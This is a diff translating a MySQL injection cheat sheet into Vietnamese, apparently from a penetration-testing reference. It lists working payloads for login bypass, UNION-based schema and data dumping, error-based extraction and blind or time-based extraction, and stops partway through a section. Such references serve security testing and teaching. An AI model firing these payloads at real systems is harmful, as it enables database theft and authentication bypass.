@@ -1,78 +1,78 @@
 # MySQL Injection
 
-> MySQL Injection  is a type of security vulnerability that occurs when an attacker is able to manipulate the SQL queries made to a MySQL database by injecting malicious input. This vulnerability is often the result of improperly handling user input, allowing attackers to execute arbitrary SQL code that can compromise the database's integrity and security.
+> MySQL Injection là một loại lỗ hổng bảo mật xảy ra khi kẻ tấn công có thể thao túng các câu truy vấn SQL gửi đến cơ sở dữ liệu MySQL bằng cách chèn dữ liệu đầu vào độc hại. Lỗ hổng này thường là kết quả của việc xử lý dữ liệu đầu vào của người dùng không đúng cách, cho phép kẻ tấn công thực thi mã SQL tùy ý có thể làm tổn hại đến tính toàn vẹn và bảo mật của cơ sở dữ liệu.
 
-## Summary
+## Tóm tắt
 
-* [MYSQL Default Databases](#mysql-default-databases)
-* [MYSQL Comments](#mysql-comments)
-* [MYSQL Testing Injection](#mysql-testing-injection)
-* [MYSQL Union Based](#mysql-union-based)
-    * [Detect Columns Number](#detect-columns-number)
-        * [Iterative NULL Method](#iterative-null-method)
-        * [ORDER BY Method](#order-by-method)
-        * [LIMIT INTO Method](#limit-into-method)
-    * [Extract Database With Information_schema](#extract-database-with-information_schema)
-    * [Extract Columns Name Without Information_Schema](#extract-columns-name-without-information_schema)
-    * [Extract Data Without Columns Name](#extract-data-without-columns-name)
-* [MYSQL Error Based](#mysql-error-based)
-    * [MYSQL Error Based - Basic](#mysql-error-based---basic)
-    * [MYSQL Error Based - UpdateXML Function](#mysql-error-based---updatexml-function)
-    * [MYSQL Error Based - Extractvalue Function](#mysql-error-based---extractvalue-function)
-* [MYSQL Blind](#mysql-blind)
-    * [MYSQL Blind With Substring Equivalent](#mysql-blind-with-substring-equivalent)
-    * [MYSQL Blind Using A Conditional Statement](#mysql-blind-using-a-conditional-statement)
-    * [MYSQL Blind With MAKE_SET](#mysql-blind-with-make_set)
-    * [MYSQL Blind With LIKE](#mysql-blind-with-like)
-    * [MySQL Blind With REGEXP](#mysql-blind-with-regexp)
-* [MYSQL Time Based](#mysql-time-based)
-    * [Using SLEEP in a Subselect](#using-sleep-in-a-subselect)
-    * [Using Conditional Statements](#using-conditional-statements)
-* [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
-* [MYSQL Current Queries](#mysql-current-queries)
-* [MYSQL Read Content of a File](#mysql-read-content-of-a-file)
-* [MYSQL Command Execution](#mysql-command-execution)
-    * [WEBSHELL - OUTFILE method](#webshell---outfile-method)
-    * [WEBSHELL - DUMPFILE method](#webshell---dumpfile-method)
-    * [COMMAND - UDF Library](#command---udf-library)
+* [Các cơ sở dữ liệu mặc định của MYSQL](#mysql-default-databases)
+* [Chú thích trong MYSQL](#mysql-comments)
+* [Kiểm tra khả năng bị Injection trên MYSQL](#mysql-testing-injection)
+* [Khai thác dựa trên Union trên MYSQL](#mysql-union-based)
+    * [Xác định số lượng cột](#detect-columns-number)
+        * [Phương pháp NULL lặp lại](#iterative-null-method)
+        * [Phương pháp ORDER BY](#order-by-method)
+        * [Phương pháp LIMIT INTO](#limit-into-method)
+    * [Trích xuất cơ sở dữ liệu bằng Information_schema](#extract-database-with-information_schema)
+    * [Trích xuất tên cột mà không cần Information_Schema](#extract-columns-name-without-information_schema)
+    * [Trích xuất dữ liệu mà không cần tên cột](#extract-data-without-columns-name)
+* [Khai thác dựa trên lỗi trên MYSQL](#mysql-error-based)
+    * [Khai thác dựa trên lỗi - Cơ bản](#mysql-error-based---basic)
+    * [Khai thác dựa trên lỗi - Hàm UpdateXML](#mysql-error-based---updatexml-function)
+    * [Khai thác dựa trên lỗi - Hàm Extractvalue](#mysql-error-based---extractvalue-function)
+* [Khai thác dạng mù (Blind) trên MYSQL](#mysql-blind)
+    * [Khai thác mù tương đương với Substring](#mysql-blind-with-substring-equivalent)
+    * [Khai thác mù dùng câu lệnh điều kiện](#mysql-blind-using-a-conditional-statement)
+    * [Khai thác mù với MAKE_SET](#mysql-blind-with-make_set)
+    * [Khai thác mù với LIKE](#mysql-blind-with-like)
+    * [Khai thác mù với REGEXP](#mysql-blind-with-regexp)
+* [Khai thác dựa trên thời gian trên MYSQL](#mysql-time-based)
+    * [Dùng SLEEP trong Subselect](#using-sleep-in-a-subselect)
+    * [Dùng các câu lệnh điều kiện](#using-conditional-statements)
+* [MYSQL DIOS - Trích xuất toàn bộ trong một lần](#mysql-dios---dump-in-one-shot)
+* [Các truy vấn hiện tại trên MYSQL](#mysql-current-queries)
+* [Đọc nội dung một tập tin trên MYSQL](#mysql-read-content-of-a-file)
+* [Thực thi lệnh trên MYSQL](#mysql-command-execution)
+    * [WEBSHELL - Phương pháp OUTFILE](#webshell---outfile-method)
+    * [WEBSHELL - Phương pháp DUMPFILE](#webshell---dumpfile-method)
+    * [LỆNH - Thư viện UDF](#command---udf-library)
 * [MYSQL INSERT](#mysql-insert)
-* [MYSQL Truncation](#mysql-truncation)
+* [Cắt xén dữ liệu trên MYSQL (Truncation)](#mysql-truncation)
 * [MYSQL Out of Band](#mysql-out-of-band)
-    * [DNS Exfiltration](#dns-exfiltration)
-    * [UNC Path - NTLM Hash Stealing](#unc-path---ntlm-hash-stealing)
-* [MYSQL WAF Bypass](#mysql-waf-bypass)
-    * [Alternative to Information Schema](#alternative-to-information-schema)
-    * [Alternative to VERSION](#alternative-to-version)
-    * [Alternative to GROUP_CONCAT](#alternative-to-group_concat)
-    * [Scientific Notation](#scientific-notation)
-    * [Conditional Comments](#conditional-comments)
-    * [Wide Byte Injection (GBK)](#wide-byte-injection-gbk)
-* [References](#references)
+    * [Trích xuất dữ liệu qua DNS](#dns-exfiltration)
+    * [Đường dẫn UNC - Đánh cắp hash NTLM](#unc-path---ntlm-hash-stealing)
+* [Vượt qua WAF trên MYSQL](#mysql-waf-bypass)
+    * [Phương án thay thế cho Information Schema](#alternative-to-information-schema)
+    * [Phương án thay thế cho VERSION](#alternative-to-version)
+    * [Phương án thay thế cho GROUP_CONCAT](#alternative-to-group_concat)
+    * [Ký hiệu khoa học (Scientific Notation)](#scientific-notation)
+    * [Chú thích có điều kiện](#conditional-comments)
+    * [Chèn ký tự đa byte (GBK)](#wide-byte-injection-gbk)
+* [Tài liệu tham khảo](#references)
 
-## MYSQL Default Databases
+## Các cơ sở dữ liệu mặc định của MYSQL
 
-| Name               | Description                         |
-| ------------------ | ----------------------------------- |
-| mysql              | Requires root privileges            |
-| information_schema | Available from version 5 and higher |
+| Tên                 | Mô tả                                |
+| ------------------- | -------------------------------------- |
+| mysql               | Yêu cầu quyền root                     |
+| information_schema  | Có sẵn từ phiên bản 5 trở lên          |
 
-## MYSQL Comments
+## Chú thích trong MYSQL
 
-MySQL comments are annotations in SQL code that are ignored by the MySQL server during execution.
+Chú thích trong MySQL là các đoạn ghi chú trong mã SQL sẽ bị máy chủ MySQL bỏ qua khi thực thi.
 
-| Type                       | Description                       |
-| -------------------------- | --------------------------------- |
-| `#`                        | Hash comment                      |
-| `/* MYSQL Comment */`      | C-style comment                   |
-| `/*! MYSQL Special SQL */` | Special SQL                       |
-| `/*!32302 10*/`            | Comment for MYSQL version 3.23.02 |
-| `--`                       | SQL comment                       |
-| `;%00`                     | Nullbyte                          |
-| \`                         | Backtick                          |
+| Loại                        | Mô tả                             |
+| ---------------------------- | ----------------------------------- |
+| `#`                          | Chú thích dạng Hash                |
+| `/* MYSQL Comment */`       | Chú thích kiểu C                   |
+| `/*! MYSQL Special SQL */`  | SQL đặc biệt                       |
+| `/*!32302 10*/`             | Chú thích cho phiên bản MYSQL 3.23.02 |
+| `--`                        | Chú thích dạng SQL                 |
+| `;%00`                      | Byte null                          |
+| \`                          | Dấu backtick                       |
 
-## MYSQL Testing Injection
+## Kiểm tra khả năng bị Injection trên MYSQL
 
-* **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`
+* **Chuỗi (Strings)**: Câu truy vấn kiểu `SELECT * FROM Table WHERE id = 'FUZZ';`
 
     ```ps1
     ' False
@@ -83,7 +83,7 @@ MySQL comments are annotations in SQL code that are ignored by the MySQL server 
     \\ True
     ```
 
-* **Numeric**: Query like `SELECT * FROM Table WHERE id = FUZZ;`
+* **Số (Numeric)**: Câu truy vấn kiểu `SELECT * FROM Table WHERE id = FUZZ;`
 
     ```ps1
     AND 1     True
@@ -96,7 +96,7 @@ MySQL comments are annotations in SQL code that are ignored by the MySQL server 
     1*56     Returns 1 if not vulnerable
     ```
 
-* **Login**: Query like `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`
+* **Đăng nhập (Login)**: Câu truy vấn kiểu `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`
 
     ```ps1
     ' OR '1
@@ -108,15 +108,15 @@ MySQL comments are annotations in SQL code that are ignored by the MySQL server 
     '=0--+
     ```
 
-## MYSQL Union Based
+## Khai thác dựa trên Union trên MYSQL
 
-### Detect Columns Number
+### Xác định số lượng cột
 
-To successfully perform a union-based SQL injection, an attacker needs to know the number of columns in the original query.
+Để thực hiện thành công một cuộc tấn công SQL injection dựa trên union, kẻ tấn công cần biết số lượng cột trong câu truy vấn gốc.
 
-#### Iterative NULL Method
+#### Phương pháp NULL lặp lại
 
-Systematically increase the number of columns in the `UNION SELECT` statement until the payload executes without errors or produces a visible change. Each iteration checks the compatibility of the column count.
+Tăng dần một cách có hệ thống số lượng cột trong câu lệnh `UNION SELECT` cho đến khi payload thực thi mà không gặp lỗi hoặc tạo ra một thay đổi có thể quan sát được. Mỗi lần lặp sẽ kiểm tra tính tương thích của số lượng cột.
 
 ```sql
 UNION SELECT NULL;--
@@ -124,90 +124,90 @@ UNION SELECT NULL, NULL;--
 UNION SELECT NULL, NULL, NULL;-- 
 ```
 
-#### ORDER BY Method
+#### Phương pháp ORDER BY
 
-Keep incrementing the number until you get a `False` response. Even though `GROUP BY` and `ORDER BY` have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.
+Tiếp tục tăng số lượng cho đến khi nhận được phản hồi `False`. Mặc dù `GROUP BY` và `ORDER BY` có chức năng khác nhau trong SQL, cả hai đều có thể được sử dụng theo cùng một cách để xác định số lượng cột trong câu truy vấn.
 
-| ORDER BY        | GROUP BY        | Result |
-| --------------- | --------------- | ------ |
-| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |
-| `ORDER BY 2--+` | `GROUP BY 2--+` | True   |
-| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |
-| `ORDER BY 4--+` | `GROUP BY 4--+` | False  |
+| ORDER BY        | GROUP BY        | Kết quả |
+| --------------- | --------------- | ------- |
+| `ORDER BY 1--+` | `GROUP BY 1--+` | True    |
+| `ORDER BY 2--+` | `GROUP BY 2--+` | True    |
+| `ORDER BY 3--+` | `GROUP BY 3--+` | True    |
+| `ORDER BY 4--+` | `GROUP BY 4--+` | False   |
 
-Since the result is false for `ORDER BY 4`, it means the SQL query is only having 3 columns.
-In the `UNION` based SQL injection, you can `SELECT` arbitrary data to display on the page: `-1' UNION SELECT 1,2,3--+`.
+Vì kết quả là false với `ORDER BY 4`, điều đó có nghĩa là câu truy vấn SQL chỉ có 3 cột.
+Trong SQL injection dựa trên `UNION`, ta có thể `SELECT` dữ liệu tùy ý để hiển thị trên trang: `-1' UNION SELECT 1,2,3--+`.
 
-Similar to the previous method, we can check the number of columns with one request if error showing is enabled.
+Tương tự phương pháp trước, ta có thể kiểm tra số lượng cột chỉ trong một request nếu tính năng hiển thị lỗi được bật.
 
 ```sql
 ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
 ```
 
-#### LIMIT INTO Method
+#### Phương pháp LIMIT INTO
 
-This method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause.
+Phương pháp này hiệu quả khi tính năng báo lỗi được bật. Nó có thể giúp xác định số lượng cột trong trường hợp điểm injection nằm sau một mệnh đề LIMIT.
 
-| Payload                      | Error                                                           |
-| ---------------------------- | --------------------------------------------------------------- |
-| `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |
-| `1' LIMIT 1,1 INTO @,@--+`   | `The used SELECT statements have a different number of columns` |
-| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns`                           |
+| Payload                       | Lỗi                                                               |
+| ------------------------------ | -------------------------------------------------------------------- |
+| `1' LIMIT 1,1 INTO @--+`      | `The used SELECT statements have a different number of columns`   |
+| `1' LIMIT 1,1 INTO @,@--+`    | `The used SELECT statements have a different number of columns`   |
+| `1' LIMIT 1,1 INTO @,@,@--+`  | `Không có lỗi nghĩa là truy vấn dùng 3 cột`                        |
 
-Since the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.
+Vì kết quả không hiển thị lỗi nào, điều đó có nghĩa là truy vấn dùng 3 cột: `-1' UNION SELECT 1,2,3--+`.
 
-### Extract Database With Information_Schema
+### Trích xuất cơ sở dữ liệu bằng Information_Schema
 
-This query retrieves the names of all schemas (databases) on the server.
+Câu truy vấn này lấy ra tên của tất cả các schema (cơ sở dữ liệu) trên máy chủ.
 
 ```sql
 UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
 ```
 
-This query retrieves the names of all tables within a specified schema (the schema name is represented by PLACEHOLDER).
+Câu truy vấn này lấy ra tên của tất cả các bảng trong một schema cụ thể (tên schema được thể hiện bằng PLACEHOLDER).
 
 ```sql
 UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
 ```
 
-This query retrieves the names of all columns in a specified table.
+Câu truy vấn này lấy ra tên của tất cả các cột trong một bảng cụ thể.
 
 ```sql
 UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
 ```
 
-This query aims to retrieve data from a specific table.
+Câu truy vấn này nhằm mục đích lấy dữ liệu từ một bảng cụ thể.
 
 ```sql
 UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
 ```
 
-### Extract Columns Name Without Information_Schema
+### Trích xuất tên cột mà không cần Information_Schema
 
-Method for `MySQL >= 4.1`.
+Phương pháp cho `MySQL >= 4.1`.
 
-| Payload                                                                   | Output                                 |
-| ------------------------------------------------------------------------- | -------------------------------------- |
-| `(1)and(SELECT * from db.users)=(1)`                                      | Operand should contain **4** column(s) |
-| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null         |
+| Payload                                                                    | Kết quả đầu ra                          |
+| ---------------------------------------------------------------------------- | -------------------------------------- |
+| `(1)and(SELECT * from db.users)=(1)`                                        | Operand should contain **4** column(s) |
+| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)`   | Column '**id**' cannot be null         |
 
-Method for `MySQL 5`
+Phương pháp cho `MySQL 5`
 
-| Payload                                                                  | Output                           |
-| ------------------------------------------------------------------------ | -------------------------------- |
-| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a`                | Duplicate column name '**id**'   |
-| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a`      | Duplicate column name '**name**' |
-| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data                             |
+| Payload                                                                    | Kết quả đầu ra                     |
+| ---------------------------------------------------------------------------- | ------------------------------------ |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a`                  | Duplicate column name '**id**'      |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a`        | Duplicate column name '**name**'    |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a`   | Dữ liệu                             |
 
-### Extract Data Without Columns Name
+### Trích xuất dữ liệu mà không cần tên cột
 
-Extracting data from the 4th column without knowing its name.
+Trích xuất dữ liệu từ cột thứ 4 mà không cần biết tên của nó.
 
 ```sql
 SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
 ```
 
-Injection example inside the query `select author_id,title from posts where author_id=[INJECT_HERE]`
+Ví dụ chèn injection bên trong câu truy vấn `select author_id,title from posts where author_id=[INJECT_HERE]`
 
 ```sql
 MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
@@ -218,10 +218,10 @@ MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SE
 +-----------+-----------------------------------------------------------------+
 ```
 
-## MYSQL Error Based
+## Khai thác dựa trên lỗi trên MYSQL
 
-| Name         | Payload                                                                                        |
-| ------------ | ---------------------------------------------------------------------------------------------- |
+| Tên          | Payload                                                                                        |
+| ------------- | ---------------------------------------------------------------------------------------------- |
 | GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -`                                |
 | JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
 | EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -`                           |
@@ -231,16 +231,16 @@ MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SE
 | NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--`          |
 | UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1`                                                                |
 
-### MYSQL Error Based - Basic
+### Khai thác dựa trên lỗi - Cơ bản
 
-Works with `MySQL >= 4.1`
+Hoạt động với `MySQL >= 4.1`
 
 ```sql
 (SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
 '+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
 ```
 
-### MYSQL Error Based - UpdateXML Function
+### Khai thác dựa trên lỗi - Hàm UpdateXML
 
 ```sql
 AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
@@ -250,16 +250,16 @@ AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126))
 AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
 ```
 
-Shorter to read:
+Ngắn gọn hơn:
 
 ```sql
 UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
 UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
 ```
 
-### MYSQL Error Based - Extractvalue Function
+### Khai thác dựa trên lỗi - Hàm Extractvalue
 
-Works with `MySQL >= 5.1`
+Hoạt động với `MySQL >= 5.1`
 
 ```sql
 ?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
@@ -269,9 +269,9 @@ Works with `MySQL >= 5.1`
 ?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
 ```
 
-### MYSQL Error Based - NAME_CONST function (only for constants)
+### Khai thác dựa trên lỗi - Hàm NAME_CONST (chỉ dùng cho hằng số)
 
-Works with `MySQL >= 5.0`
+Hoạt động với `MySQL >= 5.0`
 
 ```sql
 ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
@@ -279,19 +279,19 @@ Works with `MySQL >= 5.0`
 ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
 ```
 
-## MYSQL Blind
+## Khai thác dạng mù (Blind) trên MYSQL
 
-### MYSQL Blind With Substring Equivalent
+### Khai thác mù tương đương với Substring
 
-| Function    | Example                        | Description                                                         |
-| ----------- | ------------------------------ | ------------------------------------------------------------------- |
-| `SUBSTR`    | `SUBSTR(version(),1,1)=5`      | Extracts a substring from a string (starting at any position)       |
-| `SUBSTRING` | `SUBSTRING(version(),1,1)=5`   | Extracts a substring from a string (starting at any position)       |
-| `RIGHT`     | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |
-| `MID`       | `MID(version(),1,1)=4`         | Extracts a substring from a string (starting at any position)       |
-| `LEFT`      | `LEFT(version(),1)=4`          | Extracts a number of characters from a string (starting from left)  |
+| Hàm         | Ví dụ                            | Mô tả                                                                  |
+| ----------- | ---------------------------------- | ------------------------------------------------------------------------- |
+| `SUBSTR`    | `SUBSTR(version(),1,1)=5`         | Trích xuất một chuỗi con từ một chuỗi (bắt đầu ở bất kỳ vị trí nào)       |
+| `SUBSTRING` | `SUBSTRING(version(),1,1)=5`      | Trích xuất một chuỗi con từ một chuỗi (bắt đầu ở bất kỳ vị trí nào)       |
+| `RIGHT`     | `RIGHT(left(version(),1),1)=5`    | Trích xuất một số ký tự từ một chuỗi (bắt đầu từ bên phải)                |
+| `MID`       | `MID(version(),1,1)=4`            | Trích xuất một chuỗi con từ một chuỗi (bắt đầu ở bất kỳ vị trí nào)       |
+| `LEFT`      | `LEFT(version(),1)=4`             | Trích xuất một số ký tự từ một chuỗi (bắt đầu từ bên trái)                |
 
-Examples of Blind SQL injection using `SUBSTRING` or another equivalent function:
+Ví dụ về Blind SQL injection sử dụng `SUBSTRING` hoặc một hàm tương đương khác:
 
 ```sql
 ?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
@@ -299,9 +299,9 @@ Examples of Blind SQL injection using `SUBSTRING` or another equivalent function
 ?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
 ```
 
-### MYSQL Blind Using a Conditional Statement
+### Khai thác mù dùng câu lệnh điều kiện
 
-* TRUE: `if @@version starts with a 5`:
+* TRUE: `nếu @@version bắt đầu bằng số 5`:
 
     ```sql
     2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
@@ -309,7 +309,7 @@ Examples of Blind SQL injection using `SUBSTRING` or another equivalent function
     HTTP/1.1 500 Internal Server Error
     ```
 
-* FALSE: `if @@version starts with a 4`:
+* FALSE: `nếu @@version bắt đầu bằng số 4`:
 
     ```sql
     2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
@@ -317,7 +317,7 @@ Examples of Blind SQL injection using `SUBSTRING` or another equivalent function
     HTTP/1.1 200 OK
     ```
 
-### MYSQL Blind With MAKE_SET
+### Khai thác mù với MAKE_SET
 
 ```sql
 AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
@@ -326,33 +326,33 @@ AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
 AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
 ```
 
-### MYSQL Blind With LIKE
+### Khai thác mù với LIKE
 
-In MySQL, the `LIKE` operator can be used to perform pattern matching in queries. The operator allows the use of wildcard characters to match unknown or partial string values. This is especially useful in a blind SQL injection context when an attacker does not know the length or specific content of the data stored in the database.
+Trong MySQL, toán tử `LIKE` có thể được dùng để so khớp mẫu (pattern matching) trong các câu truy vấn. Toán tử này cho phép sử dụng các ký tự đại diện để so khớp các giá trị chuỗi chưa biết hoặc chỉ biết một phần. Điều này đặc biệt hữu ích trong bối cảnh blind SQL injection khi kẻ tấn công không biết độ dài hoặc nội dung cụ thể của dữ liệu được lưu trong cơ sở dữ liệu.
 
-Wildcard Characters in LIKE:
+Các ký tự đại diện trong LIKE:
 
-* **Percentage Sign** (`%`): This wildcard represents zero, one, or multiple characters. It can be used to match any sequence of characters.
-* **Underscore** (`_`): This wildcard represents a single character. It's used for more precise matching when you know the structure of the data but not the specific character at a particular position.
+* **Dấu phần trăm** (`%`): Ký tự đại diện này đại diện cho không, một, hoặc nhiều ký tự. Nó có thể được dùng để so khớp bất kỳ chuỗi ký tự nào.
+* **Dấu gạch dưới** (`_`): Ký tự đại diện này đại diện cho một ký tự đơn. Nó được dùng để so khớp chính xác hơn khi bạn biết cấu trúc của dữ liệu nhưng không biết ký tự cụ thể tại một vị trí nào đó.
 
 ```sql
 SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
 SELECT * FROM products WHERE product_name LIKE '%user_input%'
 ```
 
-### MySQL Blind with REGEXP
+### Khai thác mù với REGEXP
 
-Blind SQL injection can also be performed using the MySQL `REGEXP` operator, which is used for matching a string against a regular expression. This technique is particularly useful when attackers want to perform more complex pattern matching than what the `LIKE` operator can offer.
+Blind SQL injection cũng có thể được thực hiện bằng toán tử `REGEXP` của MySQL, dùng để so khớp một chuỗi với một biểu thức chính quy (regular expression). Kỹ thuật này đặc biệt hữu ích khi kẻ tấn công muốn thực hiện việc so khớp mẫu phức tạp hơn so với những gì toán tử `LIKE` có thể cung cấp.
 
-| Payload                                                                | Description                         |
-| ---------------------------------------------------------------------- | ----------------------------------- |
-| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length                     |
-| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |
-| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by "a"   |
+| Payload                                                                | Mô tả                              |
+| ---------------------------------------------------------------------- | ------------------------------------- |
+| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Kiểm tra độ dài                       |
+| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Kiểm tra sự có mặt của chữ số         |
+| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Kiểm tra dữ liệu bắt đầu bằng "a"     |
 
-## MYSQL Time Based
+## Khai thác dựa trên thời gian trên MYSQL
 
-The following SQL codes will delay the output from MySQL.
+Các đoạn mã SQL sau đây sẽ làm trễ kết quả đầu ra từ MySQL.
 
 * MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)
 
@@ -372,9 +372,9 @@ The following SQL codes will delay the output from MySQL.
     AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
     ```
 
-### Using SLEEP in a Subselect
+### Dùng SLEEP trong Subselect
 
-Extracting the length of the data.
+Trích xuất độ dài của dữ liệu.
 
 ```sql
 1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
@@ -383,21 +383,21 @@ Extracting the length of the data.
 1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
 ```
 
-Extracting the first character.
+Trích xuất ký tự đầu tiên.
 
 ```sql
 1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
 1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
 ```
 
-Extracting the second character.
+Trích xuất ký tự thứ hai.
 
 ```sql
 1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
 1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
 ```
 
-Extracting the third character.
+Trích xuất ký tự thứ ba.
 
 ```sql
 1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
@@ -405,13 +405,13 @@ Extracting the third character.
 1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
 ```
 
-Extracting column_name.
+Trích xuất column_name.
 
 ```sql
 1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
 ```
 
-### Using Conditional Statements
+### Dùng các câu lệnh điều kiện
 
 ```sql
 ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
@@ -419,9 +419,9 @@ Extracting column_name.
 ?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
 ```
 
-## MYSQL DIOS - Dump in One Shot
+## MYSQL DIOS - Trích xuất toàn bộ trong một lần
 
-DIOS (Dump In One Shot) SQL Injection is an advanced technique that allows an attacker to extract entire database contents in a single, well-crafted SQL injection payload. This method leverages the ability to concatenate multiple pieces of data into a single result set, which is then returned in one response from the database.
+SQL Injection dạng DIOS (Dump In One Shot) là một kỹ thuật nâng cao cho phép kẻ tấn công trích xuất toàn bộ nội dung cơ sở dữ liệu chỉ trong một payload SQL injection được xây dựng cẩn thận. Phương pháp này tận dụng khả năng nối nhiều mẩu dữ liệu thành một tập kết quả duy nhất, sau đó được trả về trong một phản hồi duy nhất từ cơ sở dữ liệu.
 
 ```sql
